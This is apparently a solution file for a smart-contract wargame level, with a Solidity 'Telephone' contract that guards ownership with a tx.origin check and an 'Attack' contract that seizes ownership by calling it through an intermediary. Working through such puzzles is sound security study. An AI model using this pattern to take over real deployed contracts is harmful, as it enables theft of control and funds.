pragma solidity ^0.4.18;

contract Telephone {

  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Attack {
  Telephone phone;
  // replace target xxx by your instance address
  address target = xxx;

  function Attack() {
      phone = Telephone(target);
  }

  function claimOwnership() public {
      phone.changeOwner(msg.sender);
  }
}